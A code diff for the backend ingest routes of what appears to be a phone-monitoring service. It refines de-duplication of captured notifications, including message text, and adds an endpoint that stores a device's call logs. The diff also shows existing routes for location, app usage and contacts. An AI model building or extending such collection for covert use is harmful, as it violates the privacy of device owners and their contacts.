@@ -5,6 +5,7 @@ import Location from "../models/Location.js";
 import AppUsage from "../models/AppUsage.js";
 import NotificationLog from "../models/NotificationLog.js";
 import Contact from "../models/Contact.js";
+import CallLog from "../models/CallLog.js";
 
 const router = Router();
 
@@ -71,12 +72,15 @@ router.post("/notifications", async (req, res) => {
   const { items = [] } = req.body || {};
   const deviceId = req.device.deviceId;
   const ops = items.map((i) => {
-    // The app's `key` (Android's sbn.key) is reused for the same notification
-    // slot, so two different messages from the same app — often with the same
-    // title/appLabel — would collide and overwrite each other. Derive the dedup
-    // key from the message content + the app's slot key + postedAt so each
-    // distinct notification is stored separately, while a true re-send of the
-    // identical notification (same content + slot + time) still de-duplicates.
+    // Bucket the post time to the SECOND. Apps like WhatsApp re-post the exact
+    // same notification a few milliseconds apart (bumping a counter / re-emitting
+    // MessagingStyle); those reposts land in the same second and collapse to one
+    // row. A per-second bucket is deliberately fine-grained so we NEVER merge two
+    // genuinely distinct notifications — that would require identical app, title
+    // and text within the very same second, which real messages do not produce.
+    const secondBucket = i.postedAt
+      ? new Date(i.postedAt).toISOString().slice(0, 19) // YYYY-MM-DDTHH:mm:ss
+      : "";
     const dedupeKey = crypto
       .createHash("sha1")
       .update(
@@ -85,8 +89,7 @@ router.post("/notifications", async (req, res) => {
           i.appLabel || "",
           i.title || "",
           i.text || "",
-          i.key || "",
-          i.postedAt || "",
+          secondBucket,
         ].join("\u0000")
       )
       .digest("hex");
@@ -136,6 +139,39 @@ router.post("/contacts", async (req, res) => {
   }));
   if (ops.length) await Contact.bulkWrite(ops, { ordered: false }).catch(() => {});
   res.json({ upserted: ops.length });
+});
+
+// POST /api/ingest/calllogs  { items: [{callId,number,name,type,durationSec,timestamp}] }
+router.post("/calllogs", async (req, res) => {
+  const { items = [] } = req.body || {};
+  const deviceId = req.device.deviceId;
+  const ops = items.map((i) => ({
+    updateOne: {
+      filter: { deviceId, callId: i.callId },
+      update: { $set: { ...i, deviceId } },
+      upsert: true,
+    },
+  }));
+  if (!ops.length) return res.json({ received: 0, upserted: 0 });
+
+  try {
+    // ordered:false so one bad/duplicate row never blocks the rest of the batch.
+    const r = await CallLog.bulkWrite(ops, { ordered: false });
+    const upserted = (r.upsertedCount || 0) + (r.modifiedCount || 0);
+    return res.json({ received: ops.length, upserted });
+  } catch (err) {
+    const res0 = err.result?.result || {};
+    const upserted = (res0.nUpserted || 0) + (res0.nModified || 0);
+    const nonDup = (err.writeErrors || []).filter((e) => e.code !== 11000);
+    if (nonDup.length) {
+      console.error(
+        "[ingest] calllogs bulkWrite error:",
+        nonDup[0].errmsg || err.message
+      );
+      return res.status(500).json({ error: "ingest failed", upserted });
+    }
+    return res.json({ received: ops.length, upserted });
+  }
 });
 
 export default router;
